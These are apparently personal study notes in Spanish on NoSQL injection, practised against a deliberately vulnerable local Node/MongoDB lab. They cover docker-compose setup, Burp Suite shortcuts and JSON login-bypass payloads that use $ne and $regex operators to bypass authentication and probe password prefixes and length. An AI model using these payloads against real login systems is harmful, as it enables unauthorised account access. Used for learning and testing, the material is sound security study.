# NO-SQL Intection 

## DATABASE - TABLES - COLUMS - DATA 
Asi se conforma una base de datos

DB que son No-SQL (CouchBase, Cassandra, DynamoDB, MongoDB)

https://github.com/Charlie-belmer/vulnerable-node-app Repositorio en Github
- Comando -> **apt install docker-compose** Instalar Docker-Compose, para poder usar el laboratorio que nos clonaremos
- Comando -> **docker-compose up -d** Despliegas el contedor Docker
- Comando -> **docker ps**  Miramos el puerto de Docker 4000 (localhost:4000)
	populated / Reset DB Para que nos cree 5 usuarios

Webpages No-SQLI Cheat Sheet-> **hacktricks no sql injection (https://book.hacktricks.xyz/pentesting-web/nosql-injection)** 
					**payloadallthethings no sql inyection (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQInjection)** 


## Primero en BurpSuite
Lo haremos desde Burp Suite 
- Comando -> **burpsuite &> /dev/null & diswon** Abrimos Burpsuite y lo independizamos 

Ctrl + u -> Encodeas el codigo seleccionado
Ctrl + r -> Para pasarlo al repeater y que ahi sea mas comodo
Ctrl + espacio -> Para ver rapidamente en la derecha la respuesta en el repeater


## Inyecciones NO-SQL

En BurpSuite 
**Content-Type: application/json**  Debe de estar asi si queremos tramitar por Json

### Forma original en Json  
{
	"username" : **"admin"**,
	"password" : **"admin"**
} 

### No-SQL colocando el not-equal en un panel de autenticacion 
Decimos que un campo es valido al existir, mientras que el segundo tambien es valido ya que al momento de decir que no es ese valor, seria una afirmacion. Podemos negar los dos al mismo tiempo o solo un campo, eso si sabemos que uno es valido.
{
	"username" : "admin",
	"password" : **{"$ne":"mongo"}**
} 
{
	"username" : **{"$ne":"admin"}**,
	"password" : "mongo"
} 

### No-SQL colocando regex 
Podemos colocar diferentes expresiones regulares
{
	"username" : "admin",
	"password" : **{"$regex":"^2a"}**
} 
**^** en regex decimos que ese campo empieza con esa letra, palabra, numero 
{
	"username" : "admin",
	"password" : **{"$regex":".{10}"}**
} 
**.{}** Para preguntar si ese campo tiene cierto # de caracteres de longitud



Aveces es necesario cambiar el metodo de GET a POST en BurpSuite y cambiar la estructura en formato Json, agregando el Content-Type en Jason.



